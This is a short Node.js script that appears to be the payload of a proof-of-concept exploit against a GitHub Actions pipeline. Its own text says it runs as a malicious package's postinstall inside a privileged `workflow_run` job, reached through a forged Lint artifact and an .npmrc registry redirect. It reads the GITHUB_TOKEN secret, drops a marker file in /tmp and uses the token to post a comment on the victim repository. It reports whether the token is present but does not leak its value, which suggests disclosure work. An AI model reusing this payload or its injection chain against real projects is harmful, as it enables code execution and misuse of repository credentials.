const fs = require('fs');
(async () => {
  const token = process.env.GITHUB_TOKEN;
  const repo = process.env.GITHUB_REPOSITORY || 'unknown/none';
  const marker = 'GAB-ADP-RCE-' + Date.now() + '-' + Math.floor(Math.random() * 1e6);
  console.log('RCE_EXEC marker=' + marker + ' token=' + (token ? 'present' : 'absent') + ' repo=' + repo);
  fs.writeFileSync('/tmp/ADP_RCE_MARKER', marker);
  if (token) {
    try {
      const r = await fetch('https://api.github.com/repos/' + repo + '/issues/1/comments', {
        method: 'POST',
        headers: {
          'Accept': 'application/vnd.github+json',
          'Authorization': 'Bearer ' + token,
          'Content-Type': 'application/json',
          'X-GitHub-Api-Version': '2022-11-28'
        },
        body: JSON.stringify({ body: '### GAB ADP RCE PoC\n\nmarker: `' + marker + '`\n\nExecuted inside the privileged `workflow_run` job via a forged `Lint` artifact (.npmrc registry redirect -> malicious package postinstall).\n\ntoken: ' + (token ? 'present' : 'absent') + '\nrepo: ' + repo })
      });
      console.log('comment_status=' + r.status);
    } catch (e) { console.log('comment_err=' + e.message); }
  }
})();
